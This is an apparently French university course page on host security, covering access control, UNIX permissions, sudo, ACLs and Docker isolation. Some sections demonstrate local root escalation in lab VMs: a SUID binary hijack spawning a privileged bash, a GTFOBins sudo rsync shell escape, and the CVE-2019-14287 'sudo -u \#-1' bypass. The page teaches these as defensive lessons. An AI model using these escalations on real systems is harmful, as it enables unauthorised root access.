<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="UTF-8">
        <meta name="author" content="Choquet Olivier & Vandenheede Driss">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Host Security - Suppléments - e-Syllabus HTML5 et CSS3</title>
        <!-- une icône dans la barre du navigateur -->
        <link rel="icon" href="../images/favicon.png" type="image/png">
        <link rel="stylesheet" href="../style.css">
    </head>
    <body>
        <!-- liens d'évitement -->
        <ul class="a11y-nav">
            <li>
                <a href="#container">Passer directement au contenu</a>
            </li>
            <li>
                <a href="#menu">Accéder au menu secondaire de la page</a>
            </li>
            <li>
                <a href="#aside">Accéder aux liens utiles</a>
            </li>
        </ul>
        
        <!-- bannière et menu -->
        <header role="banner">
            <div class="logoTitle">
                <h1>Cours d'introduction au Web</h1>
                <h2>HTML5 et CSS3</h2>
            </div>
            <nav role="navigation" aria-label="Menu principal de navigation">
                <ul>
                    <li><a href="../index.html">Le cours</a></li>
                    <li><a href="../internet.html">Internet</a></li>
                    <li><a href="../html5.html">HTML5</a></li>
                    <li><a href="../css3.html">CSS3</a></li>
                    <li><a href="../methodologie.html">Méthodologie</a></li>
                    <li><a href="../lexique.html">Lexique</a></li>
                    <li><a href="../supplements.html" class="current">Suppléments</a></li>
                </ul>
            </nav>
        </header>

        <div id="menu">
            <nav role="navigation" aria-label="Menu secondaire">
                <ol>
                    <li><a href="supplements_ITSCM.html">Retour au sommaire</a></li>
                    <li><a href="#introduction">Introduction</a></li>
                    <li><a href="#securite_information">Sécurité de l'information</a></li>
                    <li><a href="#gestion_acces">Gestion des accès</a></li>
                    <li><a href="#implementation">Implémentation</a></li>
                    <li><a href="#extensions">Extensions</a></li>
                    <li><a href="#gestion_utilisateurs">Gestion des utilisateurs</a></li>
                    <li><a href="#authentification">Authentification</a></li>
                    <li><a href="#exercices">Exercices</a></li>
                    <li><a href="#environnement_travail">Environnement de travail</a></li>
                    <li><a href="#notions">Notions</a></li>
                    <li><a href="#serveur_identite_eventuellement_authentification">Serveur d'identité (et éventuellement d'authentification)</a></li>
                    <li><a href="#authentification_reseau_SSO">Authentification réseau - Single Sign On</a></li>
                    <li><a href="#configuration_clients">Configuration des clients</a></li>
                    <li><a href="#gestion_centralisee_identite">Gestion centralisée de l'identité</a></li>
                    <li><a href="#gestion_centralisee_authentification">Gestion centralisée de l'authentification</a></li>
                    <li><a href="#evaluation_instructions_provisoires">Évaluation - instructions provisoires</a></li>
                </ol>
            </nav>
            
            <!-- aside lié à la page et pas à l'article donc pas à l'intérieur de article -->
            <aside id="aside" role="complementary">
                <p>Liens utiles :</p>
                <ul>
                    <li><a href="https://www.youtube.com/c/LeDesignerduWeb/videos">Le Designer du web</a></li>
                </ul>
            </aside>
        </div>
        
        <main id="container" role="main" tabindex="-1">
            <section id="mainSection">
                <article>
                    <h1>Host Security :</h1>
                </article>
                <article>
                    <h2 id="introduction">Introduction :</h2>
                    <h3>Objectifs :</h3>
                    <ol>
                        <li>
                            <p>Mettre en pratique et vérifier les principes outils et technologies de sécurisation des hôtes (clients, serveurs, ...).</p>
                        </li>
                        <li>
                            <p>Expliquer et justifier les choix et solutions proposées.</p>
                        </li>
                    </ol>
                    <h3>Quelques sujets abordés :</h3>
                    <ul>
                        <li>
                            <p>Gestion des accès.</p>
                        </li>
                        <li>
                            <p>Gestion des comptes utilisateurs.</p>
                        </li>
                        <li>
                            <p>Logging / Monitoring.</p>
                        </li>
                        <li>
                            <p>Encryption - protection des données.</p>
                        </li>
                        <li>
                            <p>Infrastructures à base de certificats et de clé publique.</p>
                        </li>
                        <li>
                            <p>Détection d'intrusion basée sur l'hôte.</p>
                        </li>
                        <li>
                            <p>Sécurisation (hardening) de l'operating system.</p>
                        </li>
                        <li>
                            <p>Mise en oeuvre.</p>
                        </li>
                        <li>
                            <p>Liste évolutive et sujette à changement !</p>
                        </li>
                    </ul>
                    <h3>Perspectives :</h3>
                    <ul>
                        <li>
                            <p>Perspective d'entreprise.</p>
                        </li>
                        <li>
                            <p>Principes largement valables pour différents types d'operating systems.</p>
                        </li>
                        <li>
                            <p>Exemples principalement Linux (open-source).</p>
                        </li>
                        <li>
                            <p>"Bare metal", virtualisation, OS, containers, Cloud.</p>
                        </li>
                        <li>
                            <p>Approche défensive, mais aussi sensibilité offensive.</p>
                        </li>
                        <li>
                            <p>Exemples reproductibles.</p>
                        </li>
                        <li>
                            <p>Background : mix technique, administration, management.</p>
                        </li>
                    </ul>
                    <h3>Références :</h3>
                    <ul>
                        <li>
                            <p>Foundations of Information Security - A Straightforward Introduction - Jason Andress - No Starch Press, 2019.</p>
                        </li>
                        <li>
                            <p>Unix and Linux System Administration Handbook - fifth edition - Evi Nemeth and others- Addison-Wesley, 2018.</p>
                        </li>
                    </ul>
                    <h3>Environnement de travail :</h3>
                    <ul>
                        <li>
                            <p>VirtualBox pour la virtualisation.</p>
                        </li>
                        <li>
                            <p>Vagrant pour la création et la configuration d'environnements de développement légers, reproductibles et portables.</p>
                        </li>
                        <li>
                            <p>Ubuntu (et Windows) - autres distributions possibles.</p>
                        </li>
                        <li>
                            <p class="em">Attention certains environnements délibérément vulnérables !</p>
                        </li>
                        <li>
                            <p>Connaissance de base du terminal pré-requise.</p>
                        </li>
                    </ul>
                    <h3>Instructions pour VirtualBox et Vagrant :</h3>
                    <p>Nous utiliserons les outils <a href="https://www.virtualbox.org/" target="_blank">VirtualBox</a> et <a href="https://www.vagrantup.com/" target="_blank">Vagrant</a> pour virtualiser des environnements reproductibles sur vos ordinateurs.</p>
                    <p>Il faut les installer dans cet ordre-là.</p>
                    <p>Cela nécessite des droits d'administrateur sur sa machine et parfois une configuration spécifique du BIOS (activation des fonctions de virtualisation - parfois aussi SecureBoot).</p>
                    <div class="important">
                        <img src="../images/important.png" alt="Important" class="float_left">
                        <p>ASSUREZ-VOUS DE PRENDRE LES TOUTES DERNIÈRES VERSIONS STABLES (au moment de la rédaction de cet article, testé sur Vagrant 2.4.9 et virtualbox 7.2.6 - virtualbox 7.2.0 n'est PAS stable, prendre les extensions virtualbox compatibles).</p>
                        <p>NÉCESSITE UN LINUX / WINDOWS / MAC OS récent (sur processeur Intel - support pour Silicon Apple en développement).</p>
                        <p>Si possible, installer en dualboot Linux si vous avez Windows.</p>
                    </div>
                    <p>Pour chaque environnement utilisé au cours, télécharger le folder correspondant (éventuellement le déziper) dans un folder spécifique, puis se déplacer dans ce folder.</p>
                    <p>Quelques commandes terminal Vagrant utiles (toujours dans le folder correspondant à l'environnement que l'on veut travailler) :</p>
                    <ul>
                        <li>
                            <p>Pour démarrer un environnement :</p>
<pre><code>vagrant up</code></pre>
                            <p>En résumé, cette commande démarre la machine virtuelle définie dans le <span class="em">Vagrantfile</span> (ou crée la VM si elle n'existe pas encore).</p>
                        </li>
                        <li>
                            <p>Pour rentrer dans l'environnement :</p>
<pre><code>vagrant ssh</code></pre>
                            <p>En résumé, cette commande ouvre une session SSH vers la machine virtuelle.</p>
                        </li>
                        <li>
                            <p>Pour suspendre le fonctionnement de l'environnement :</p>
<pre><code>vagrant halt</code></pre>
                            <p>En résumé, cette commande éteint proprement la machine virtuelle.</p>
                        </li>
                        <li>
                            <p>Pour supprimer un environnement :</p>
<pre><code>vagrant destroy</code></pre>
                            <p>En résumé, cette commande supprime complètement la machine virtuelle (attention, les données seront perdues).</p>
<pre><code>rm -rf .vagrant</code></pre>
                            <p>Cette commande supprime seulement les <span class="em">métadonnéeslocales</span>, mais la VM existe encore dans VirtualBox malgré que Vagrant perd la trace. C'est à utiliser <span class="em">uniquement si Vagrant est cassé</span>.</p>
                            <p><span class="em">Règle d'or</span> : on fait toujours <span class="em">vagrant destroy</span> avant <span class="em">rm -rf .vagrant</span>.</p>
                        </li>
                        <li>
                            <p>Pour redémarrer la VM :</p>
<pre><code>vagrant reload</code></pre>
                        </li>
                        <li>
                            <p>Pour afficher l'état de la VM :</p>
<pre><code>vagrant status</code></pre>
                        </li>
                        <li>
                            <p>Pour relancer le provisioning :</p>
<pre><code>vagrant provision</code></pre>
                            <p>Pour démarrer la VM et faire le provisioning :</p>
<pre><code>vagrant up --provision</code></pre>
                        </li>
                        <li>
                            <p>Pour lister toutes les VMs Vagrant et supprimer celles qui n'existent plus :</p>
<pre><code>vagrant global-status --prune</code></pre>
                            <p>En résumé, cette commande peut également nettoyer les IDs.</p>
                        </li>
                    </ul>
                    <h3>Instructions spécifiques à Linux/MacOS pour l'utilisation d'adresses spécifiques pour des machines virtualisées par VirtualBox :</h3>
                    <p>Comme mentionné dans <a href="https://www.virtualbox.org/manual/topics/networkingdetails.html#networkingdetails" target="_blank">https://www.virtualbox.org/manual/topics/networkingdetails.html#networkingdetails</a>, une configuration additionnelle est requise pour permettre à un hôte Linux/MacOS de se connecter à une machine virtuelle ayant une adresse spécifique : créer un fichier <span class="em">networks.conf</span> à l'emplacement <span class="em">/etc/virtualbox</span> et lui donner le contenu suivant (pour ce cours - bien mettre l'étoile au début) :</p>
<pre><code>* 10.0.0.0/8 172.28.128.0/16</code></pre>
                    <h3>Instructions SSH pour Windows :</h3>
                    <p>Pour les utilisateurs utilisant Windows (10+) pour l'hôte, voir <a href="https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh-overview" target="_blank">https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh-overview</a> pour la configuration du client d'OpenSSH.</p>
                    <p>Notez que <span class="em">ssh-keyscan</span> retourne un encodage UTF-16 (sur 2 bytes), là où le fichier <span class="em">known_hosts</span> semble devoir être encodé en UTF-8 (1 byte pour ASCII). Pour passer de l'un à l'autre (dans le directory <span class="em">~\.ssh</span>) :</p>
<pre><code>ssh-keyscan -t ecdsa t.x.y.z &gt; .\known_hosts2</code></pre>
                    <p>En résumé, cette commande récupère la clé publique SSH du serveur.</p>
<pre><code>gc .\known_hosts2 | sc -Encoding utf8 .\known_hosts</code></pre>
                    <p>En résumé, cette commande convertit le fichier en UTF-8 pour compatibilité OpenSSH.</p>
                    <p>On peut après faire un <span class="em">ssh</span> vers <span class="em">t.x.y.z</span> sans recevoir d'avertissement sur l'authenticité du serveur.</p>
                </article>
                <article>
                    <h2 id="securite_information">Sécurité de l'information :</h2>
                    <h3>Notion de sécurité :</h3>
                    <p><span class="em">Notion de valeur</span> : Quelle information a de la valeur ?</p>
                    <p class="em">Caractérisation de la sécurité :</p>
                    <ul>
                        <li>
                            <p>Confidentialité</p>
                        </li>
                        <li>
                            <p>Intégrité</p>
                        </li>
                        <li>
                            <p>Accessibilité</p>
                        </li>
                    </ul>
                    <h3>Les menaces :</h3>
                    <p><span class="em">Anderson</span> : Interception, Interruption, Modification, Fabrication.</p>
                    <p><span class="em">STRIDE - Microsoft</span> : Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege.</p>
                    <h3>Vulnérabilités & risques :</h3>
                    <p><span class="em">Vulnérabilité</span> : Une faiblesse qui peut être exploitée.</p>
                    <p><span class="em">Risque</span> : Probabilité que quelque chose de négatif va se passer.</p>
                    <h3>Processus de gestion des risques :</h3>
                    <p><span class="em">Processus - Anderson - <a href="https://www.ibm.com/fr-fr/topics/cyber-risk-management" target="_blank">https://www.ibm.com/fr-fr/topics/cyber-risk-management</a></span> : Actifs &#8594; Menaces &#8594; Vulnérabilités &#8594; Risques &#8594; (Acceptation, Mitigation, Transfert) &#8594; ...</p>
                    <p class="em">Mitigations / Contrôles :</p>
                    <ul>
                        <li>
                            <p>Contrôles physiques.</p>
                        </li>
                        <li>
                            <p>Contrôles <span class="em">logiques / techniques</span>.</p>
                        </li>
                        <li>
                            <p>Contrôles administratifs / organisationnels.</p>
                        </li>
                    </ul>
                </article>
                <article>
                    <h2 id="gestion_acces">Gestion des accès :</h2>
                    <h3>Définitions :</h3>
                    <ul>
                        <li>
                            <p><span class="em">Identification</span> : Affirmation de qui on est.</p>
                        </li>
                        <li>
                            <p><span class="em">Authentification</span> : Apport d'une preuve de qui on est.</p>
                        </li>
                        <li>
                            <p><span class="em">Autorisation</span> Détermination de ce qu'une personne (chose) authentifiée peut faire.</p>
                        </li>
                    </ul>
                    <h3>Identification :</h3>
                    <h4>Concept :</h4>
                    <ul>
                        <li>
                            <p>Personne, chose, système.</p>
                        </li>
                        <li>
                            <p>Nom-Prénom, identifiant, adresse.</p>
                        </li>
                    </ul>
                    <h4>Vérification :</h4>
                    <ul>
                        <li>
                            <p>ID</p>
                        </li>
                        <li>
                            <p>Peut être (relativement) facilement dupliqué, donc faible force probante.</p>
                        </li>
                    </ul>
                    <h3>Authentification :</h3>
                    <ul>
                        <li>
                            <p>Quelque chose qu'on connaît.</p>
                        </li>
                        <li>
                            <p>Quelque chose qu'on est.</p>
                        </li>
                        <li>
                            <p>Quelque chose qu'on possède.</p>
                        </li>
                        <li>
                            <p>localisation, comportement, ...</p>
                        </li>
                    </ul>
                    <h4>Facteurs multiples :</h4>
                    <ul>
                        <li>
                            <p>2FA</p>
                        </li>
                        <li>
                            <p>...</p>
                        </li>
                    </ul>
                    <h3>Autorisation :</h3>
                    <p><span class="em">Concept</span> : Qui peut faire quoi. En pratique, mis en oeuvre via le contrôle d'accès aux ressources.</p>
                    <p>Les <span class="em">types de contrôle d'accès</span> sont :</p>
                    <ul>
                        <li>
                            <p>Autoriser.</p>
                        </li>
                        <li>
                            <p>Interdire.</p>
                        </li>
                        <li>
                            <p>Limiter.</p>
                        </li>
                        <li>
                            <p>Révoquer.</p>
                        </li>
                    </ul>
                    <h3>Mise en oeuvre des contrôles d'accès :</h3>
                    <h4>Access Control List :</h4>
                    <p>Pour une ressource donnée, qui peut faire quoi.</p>
                    <ul>
                        <li>
                            <p>Fichiers.</p>
                        </li>
                        <li>
                            <p>Accès au réseau.</p>
                        </li>
                    </ul>
                    <h4>Capabilities - peu fréquent au niveau OS :</h4>
                    <p>L'utilisateur possède un <span class="em">token</span>. Accès aux resources basé uniquement sur la possession du token, pas de celui qui le possède.</p>
                    <h3>Modèles de contrôle d'accès :</h3>
                    <p><span class="em">Qui</span> détermine l'accès aux ressources.</p>
                    <ul>
                        <li>
                            <p><span class="em">Discretionary Access Control</span> : Le propriétaire de la ressource.</p>
                        </li>
                        <li>
                            <p><span class="em">Mandatory Access Control</span> : Un groupe séparé détermine l'accès aux ressources.</p>
                        </li>
                        <li>
                            <p><span class="em">Rule-based, Role-based, Multi-level Access Control</span> : Souvent, pour environnements "sensibles".</p>
                        </li>
                    </ul>
                </article>
                <article>
                    <h2 id="implementation">Implémentation de contrôle d'accès type UNIX/Linux :</h2>
                    <h3>Principaux mécanismes - Evi Nemeth &amp; others :</h3>
                    <ul>
                        <li>
                            <p>L'accès à une ressource se fait en contrôlant l'utilisateur essayant d'y accéder (et / ou le groupe de l'utilisateur).</p>
                        </li>
                        <li>
                            <p>Les ressources (fichier, processus) ont un propriétaire qui ont un accès large à la ressource.</p>
                        </li>
                        <li>
                            <p>Les propriétaires "possèdent" les ressources qu'ils créent.</p>
                        </li>
                        <li>
                            <p>L'utilisateur "root" peut agir comme le propriétaire de tout objet/ressource.</p>
                        </li>
                        <li>
                            <p>Certaines fonctions administratives sont réservées à l'utilisateur "root".</p>
                        </li>
                    </ul>
                    <h3>Contrôle d'accès aux fichiers :</h3>
                    <img src="../images/controle_acces_fichiers.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo cat /etc/group | grep site</code></pre>
                    <p>En résumé, cette commande affiche les groupes dont le nom contient <span class="em">site</span>.</p>
<pre><code>ls -la</code></pre>
                    <p>En résumé, cette commande liste tous les fichiers (y compris cachés) avec leurs permissions, propriétaires et groupes.</p>
                    <p>Chaque fichier ou répertoire possède trois blocs de permissions : <span class="em">u</span> (user (propriétaire)), <span class="em">g</span> (group) et <span class="em">o</span> (others), chacun pouvant contenir les droits <span class="em">rwx</span>.</p>
                    <p>Voici la signification des lettres et leurs valeurs :</p>
                    <table class="tableBalises">
                        <thead>
                            <tr>
                                <th>Lettre</th>
                                <th>Valeur</th>
                                <th>Fichier</th>
                                <th>Répertoire</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>r</td>
                                <td>4</td>
                                <td>lire le contenu</td>
                                <td>lister les fichiers</td>
                            </tr>
                            <tr>
                                <td>w</td>
                                <td>2</td>
                                <td>modifier</td>
                                <td>créer/supprimer</td>
                            </tr>
                            <tr>
                                <td>x</td>
                                <td>1</td>
                                <td>exécuter</td>
                                <td>entrer (cd)</td>
                            </tr>
                        </tbody>
                    </table>
<pre><code>cat /EPHEC/testacl/fichier-partage-groupe-site</code></pre>
                    <p>En résumé, cette commande affiche le contenu du fichier si les permissions le permettent.</p>
                    <p>Voici le contenu du fichier `<span class="em">fichier-partage-groupe-site</span>` :</p>
<pre><code>fichier partagé avec groupe site</code></pre>
<pre><code>cat /EPHEC/testacl/fichier-partage-tous</code></pre>
                    <p>Voici le contenu du fichier `<span class="em">fichier-partage-tous</span>` :</p>
<pre><code>fichier partagé avec tous</code></pre>
                    <h3>Contrôle d'accès aux processus :</h3>
                    <img src="../images/controle_acces_processus.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>ps au | grep user</code></pre>
                    <p>En résumé, cette commande liste les processus et filtre ceux appartenant à <span class="em">user</span>.</p>
<pre><code>kill 1788</code></pre>
                    <p>En résumé, cette commande envoie un signal (SIGTERM par défaut) au processus 1788 afin de demander l'arrêt du processus.</p>
<pre><code>kill 1875</code></pre>
                    <h3>Actions privilégiées - root :</h3>
                    <p>Les quelques actions privilégiées sont :</p>
                    <ul>
                        <li>
                            <p>Réseau</p>
                        </li>
                        <li>
                            <p>Quotas.</p>
                        </li>
                        <li>
                            <p>Régler heure.</p>
                        </li>
                        <li>
                            <p>Installer software de bas niveau...</p>
                        </li>
                    </ul>
                    <img src="../images/actions_privilegiees_root.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>id</code></pre>
                    <p>En résumé, cette commande affiche l'UID, le GID et les groupes de l'utilisateur courant.</p>
<pre><code>cat /etc/shadow | grep user</code></pre>
                    <p>En résumé, cette commande tente d'accéder aux mots de passe hashés. C'est une <span class="em">action réservée à root</span>.</p>
                    <h3>suid - changement de mot de passe :</h3>
                    <p>Le bit SUID permet à un programe de s'exécuter avec l'UID du propriétaire du fichier (souvent root).</p>
                    <img src="../images/suid_changement_password.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>ls -la /usr/bin/passwd</code></pre>
                    <p>En résumé, cette commande montre que <span class="em">passwd</span> est SUID root (<span class="em">s</span> dans les permissions).</p>
<pre><code>passwd</code></pre>
                    <p>En résumé, cette commande change le mot de passe de l'utilisateur courant. Cela fonctionne grâce au bit SUID.</p>
                    <h3>Exploitation suid programme mal sécurisé :</h3>
                    <p><a href="https://tbhaxor.com/exploiting-suid-binaries-to-get-root-user-shell/" target="_blank">https://tbhaxor.com/exploiting-suid-binaries-to-get-root-user-shell/</a></p>
                    <p>Un programme SUID mal sécruisé peut mener à une escalade de priviilèges. Exemple d'exploitation via un binaire vulnérable.</p>
                    <img src="../images/exploitation_suid_programme_mal_securise.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>cd /EPHEC/test-suid</code></pre>
<pre><code>ls -la</code></pre>
<pre><code>cp greetings1 greetings</code></pre>
<pre><code>./welcome</code></pre>
<pre><code>cp greetings2 greetings</code></pre>
<pre><code>./welcome</code></pre>
<pre><code>id</code></pre>
                    <h4>Code :</h4>
                    <img src="../images/exploitation_suid_programme_mal_securise_code.PNG" alt="">
                    <p>Voici le contenu du fichier `<span class="em">welcome.c</span>` :</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/wait.h&gt;

int main(int argc, char **argv, char **envp) {
    int child_id = fork();
    if (child_id == 0) {
        char *args[] = {"./greetings", NULL};
        execv("./greetings", args);
    } else {
        waitpid(child_id, NULL, 0);
    }
}</code></pre>
                    <p>Voici le contenu du fichier `<span class="em">greetings1</span>` :</p>
<pre><code>#!/bin/bash

echo "Greetings!"</code></pre>
                    <p>Voici le contenu du fichier `<span class="em">greetings.c</span>` :</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main (int argc, char *argv[]) {
    char *args[] = {"/bin/bash", "-p", "-i", NULL};
    return execv("/bin/bash", args);
}</code></pre>
                    <h3>Administration login root vs sudo - accès opportuniste :</h3>
                    <h4>root vs sudo :</h4>
                    <ul>
                        <li>
                            <p>root : partage du compte - peu ou pas de logging - problème de redevabilité.</p>
                        </li>
                        <li>
                            <p>sudo : actions spécifiques - logging des comandes - accès opportuniste contrôlé.</p>
                        </li>
                    </ul>
                    <img src="../images/administration_login_root_vs_sudo_acces_opportuniste.PNG" alt="">
<pre><code>sudo cat /etc/shadow | grep user</code></pre>
                    <p>En résumé, cela permet d'exécuter la commande avec les privilèges root.</p>
                    <h3>Configuration sudo :</h3>
                    <h4>Création groupe et rattachement utilisateur :</h4>
                    <img src="../images/creation_groupe_rattachement_utilisateur.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo groupadd admin</code></pre>
                    <p>En résumé, cette commande crée un nouveau groupe nommé <span class="em">admin</span>.</p>
<pre><code>sudo adduser user_adm admin</code></pre>
                    <p>En résumé, cette commande ajoute l'utilisateur <span class="em">user_adm</span> au groupe <span class="em">admin</span>.</p>
                    <h4>Contenu des groupes :</h4>
                    <img src="../images/contenu_groupes.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>cat /etc/group | grep sudo</code></pre>
<pre><code>cat /etc/group | grep admin</code></pre>
<pre><code>cat /etc/group | grep rsync_user</code></pre>
                    <p><a href="https://www.sudo.ws/docs/man/1.7.10/sudoers.man/" target="_blank">https://www.sudo.ws/docs/man/1.7.10/sudoers.man/</a></p>
                    <img src="../images/etc_sudoers.PNG" alt="">
<pre><code>sudo cat /etc/sudoers</code></pre>
                    <h3>Sécurité limitée sudo :</h3>
                    <img src="../images/securitee_limitee_sudo_1.PNG" alt="">
                    <p><a href="https://gtfobins.github.io/gtfobins/rsync/" target="_blank">https://gtfobins.github.io/gtfobins/rsync/</a></p>
                    <p>Voici les différentes commandes exécutées dans l'image précédente:</p>
<pre><code>groups</code></pre>
                    <p>En résumé, cette commande liste les groupes de l'utilisateur courant.</p>
<pre><code>sudo rsync /common/hello.txt</code></pre>
<pre><code>sudo -u user2 cat /home/user2</code></pre>
<pre><code>sudo rsync -e 'sh -c "sh 0&lt;&amp;2 1&gt;2"' 127.0.0.1:/dev/null</code></pre>
                    <p>En résumé, cette commande est un exemple d'abus de sudo via un binaire autorisé. C'est une escalade de privilèges (GTFOBins).</p>
<pre><code>id</code></pre>
                    <img src="../images/securitee_limitee_sudo_2.PNG" alt="">
                    <p><a href="https://blog.sec-it.fr/en/2021/02/08/sudo-vulns/#CVE-2019-14287" target="_blank">https://blog.sec-it.fr/en/2021/02/08/sudo-vulns/#CVE-2019-14287</a></p>
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo -u user1 ls /home/user1</code></pre>
<pre><code>sudo cat /etc/sudoers</code></pre>
<pre><code>sudo -u \#-1 /bin/bash</code></pre>
<pre><code>id</code></pre>
                    <p>Les limites de <span class="em">sudo</span> sont :</p>
                    <ul>
                        <li>
                            <p>Possibilité d'abus via des binaires (GTFOBins).</p>
                        </li>
                        <li>
                            <p>Vulnérabilités connues (par exemple : CVE-2019-14287).</p>
                        </li>
                    </ul>
                    <h3>Windows :</h3>
                    <img src="../images/windows_1.PNG" alt="">
                    <img src="../images/windows_2.PNG" alt="">
                    <h4>Quelques différences :</h4>
                    <ul>
                        <li>
                            <p>Windows : modèle plus riche de droits d'accès.</p>
                        </li>
                        <li>
                            <p>Notion d'héritage de droits.</p>
                        </li>
                        <li>
                            <p>...</p>
                        </li>
                        <li>
                            <p>(voir par exemple : <a href="https://www.cs.cornell.edu/courses/cs513/2000SP/L07.html" target="_blank">https://www.cs.cornell.edu/courses/cs513/2000SP/L07.html</a> ou <a href="https://learn.microsoft.com/enus/windows/win32/ad/access-control-inheritance" target="_blank">https://learn.microsoft.com/enus/windows/win32/ad/access-control-inheritance</a>)</p>
                        </li>
                        <li>
                            <p>Modèles convergent (surtout avec extensions).</p>
                        </li>
                    </ul>
                </article>
                <article>
                    <h2 id="extensions">Extensions :</h2>
                    <h3>Limites du modèle type - Evi nemeth &amp; others :</h3>
                    <ul>
                        <li>
                            <p>Root - point faible crucial : sudo ? - d'une certaine manière, étend la surface d'attaque.</p>
                        </li>
                        <li>
                            <p>suid - division des pouvoirs de Root, mais très vulnérable.</p>
                        </li>
                        <li>
                            <p>Dispersion des contrôles d'accès dans les différentes commandes - changement difficile.</p>
                        </li>
                        <li>
                            <p>N'adresse pas (vraiment) l'authentification dans un contexte réseau.</p>
                        </li>
                        <li>
                            <p>Difficulté d'audit - l'apparence à un groupe n'est pas indicatif des droits.</p>
                        </li>
                        <li>
                            <p>ACL limitées - rajout d'un membre à un groupe est une opération privilégiée.</p>
                        </li>
                    </ul>
                    <h3>ACL avancées (POSIX, il existe aussi NFSv4 proche Windows) :</h3>
                    <img src="../images/ACL_avancees.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo cat /etc/group | grep site</code></pre>
                    <p>En résumé, cette commande vérifie que le groupe <span class="em">site</span> existe et quels <span class="em">utilisateurs</span> en font partie.</p>
<pre><code>ls -la</code></pre>
<pre><code>getfacl fichier-partage-groupe-site</code></pre>
                    <p>En résumé, cette commande affiche les <span class="em">ACL POSIX</span> associéées au fichier.</p>
<pre><code>su user_adm</code></pre>
<pre><code>cat fichier-partage-groupe-site</code></pre>
<pre><code>su user1</code></pre>
<pre><code>setfacl -m u:user_adm:rw fichier-partage-groupe-site</code></pre>
                    <p>En résumé, cette commande permet à <span class="em">user_adm</span> d'obtenir des droits <span class="em">rw</span> <span class="em">sans être propriétaire</span> et <span class="em">sans modifier les permissions classiques</span>.</p>
<pre><code>getfacl fichier-partage-groupe-site</code></pre>
                    <p>En résumé, en réaffichant les ACL du fichier, on peut vérifier la présence de la ligne suivante :</p>
<pre><code>user:user_adm:rw-</code></pre>
<pre><code>su user_adm</code></pre>
<pre><code>cat fichier-partage-groupe-site</code></pre>
                    <h3>Kerberos - authentification via tiers de confiance :</h3>
                    <figure>
                        <img src="../images/Kerberos.svg.png" alt="">
                        <figcaption>Source : <a href="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Kerberos.svg/1200px-Kerberos.svg.png" target="_blank">https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Kerberos.svg/1200px-Kerberos.svg.pnghttps://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Kerberos.svg/1200px-Kerberos.svg.png</a></figcaption>
                    </figure>
                    <h3>Isolation via namespaces/capabilities :</h3>
                    <p><span class="em">namespaces</span> : Restriction "top down" de l'accès d'un processus aux ressources (fichiers, réseau, processus, etc.).</p>
                    <p><span class="em">capabilities</span> : Division des pouvoirs de root en privilèges "individualisés" (juste ouvrir un port réseau par exemple) (À ne pas confondre avec les capabilities comme substitut aux ACL).</p>
                    <h3>Docker et namespace - vue sur les processus internes :</h3>
                    <img src="../images/docker_namespace_vue_processus_internes.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>docker run -p 80:80 -d --name ephec nginx</code></pre>
<pre><code>curl localhost:80</code></pre>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Welcome to nginx!&lt;/title&gt;
...
&lt;/html&gt;</code></pre>
<pre><code>docker exec -ti ephec bash</code></pre>
<pre><code>apt-get update &amp;&amp; apt-get -y install procps</code></pre>
<pre><code>ps aux</code></pre>
<pre><code>ps aux | grep nginx</code></pre>
                    <h3>Docker et capabilities - désactivation sélective de chown :</h3>
                    <figure>
                        <img src="../images/docker_capabilities_desactivation_selective_chown.PNG" alt="">
                        <figcaption>Source exemple : <a href="https://dockerlabs.collabnix.com/advanced/security/capabilities/" target="_blank">https://dockerlabs.collabnix.com/advanced/security/capabilities/</a></figcaption>
                    </figure>
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>docker run -t -i debian chown nobody /</code></pre>
                    <p>En résumé, cete commande tente de changer le propriétaire du répertoire racine <span class="em">/</span> pour l'utilisateur <span class="em">nobody</span>. La commande fonctionne car root possède toutes les <span class="em">capabilities Linux</span>, dont <span class="em">CAP_CHOWN</span> pour changer le propriétaire de fichiers.</p>
<pre><code>docker run -t -i --cap-drop chown debian chown nobody /</code></pre>
                    <p>En résumé, cette commande <span class="em">retire à root</span> dans le conteneur le droit de changer les propriétaires de fichiers. La commande échoue car, même si le processus est <span class="em">root dans le conteneur</span>, il <span class="em">n'a plus la capability CAP_CHOWN</span> et donc il ne peut plus exécuter <span class="em">chown</span>.</p>
                    <h3>Sécurité Docker - importance de la bonne configuration :</h3>
                    <p><a href="https://docs.docker.com/engine/security/" target="_blank">https://docs.docker.com/engine/security/</a></p>
                    <img src="../images/securite_docker_importance_bonne_configuration.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo cat /etc/group | grep docker</code></pre>
                    <p>En résumé, cette commande affiche le groupe <span class="em">docker</span> et ses membres. C'est important car les utilisateurs dans le groupe <span class="em">docker</span> peuvent <span class="em">contrôler le daemon Docker</span>. Or le daemon Docker tourne <span class="em">en root</span>.</p>
